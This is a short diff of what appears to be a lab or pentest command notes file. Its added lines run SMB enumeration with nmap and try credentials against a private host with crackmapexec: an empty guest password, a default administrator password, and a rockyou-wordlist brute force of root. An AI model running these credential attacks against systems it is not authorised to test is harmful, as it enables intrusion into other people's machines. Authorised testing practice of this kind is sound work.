@@ -21,9 +21,20 @@ sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
 Get-NetAdapter -Physical | Where-Object {$_.Status -eq "Up"}
 
+
+
+nmap -p 445 --script smb-os-discovery,smb-enum-shares 192.168.1.84
+
 smbclient -L //192.168.1.84/ -U convidado
 
-nmap -p 445 --script smb-enum-shares 192.168.1.84
-
 crackmapexec smb 192.168.1.84 -u administrador -p 123456
+
+crackmapexec smb 192.168.1.84 -u convidado -p ""
+
+crackmapexec smb 192.168.1.84 -u root -P /usr/share/wordlists/rockyou.txt
+
+
+
+
+
 
